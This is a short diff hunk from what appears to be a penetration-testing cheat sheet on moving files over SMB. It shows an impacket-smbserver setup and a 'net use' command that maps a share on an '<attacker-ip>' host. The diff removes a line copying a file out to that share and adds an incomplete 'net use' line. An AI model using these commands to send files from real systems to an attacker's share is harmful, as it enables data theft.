@@ -18,7 +18,7 @@ impacket-smbserver /<sharename> /<folder-to-user> -ip <attacker-ip> -u 'Guest' -
 
 ```
 net use \\<attacker-ip>\<sharename> -Username 'Guest':'Password123!'
-copy <filename.ext> \\<attacker-ip>\<sharename>\<filename.ext>
+net use 
 ```
 
 *Other ways of delivering*
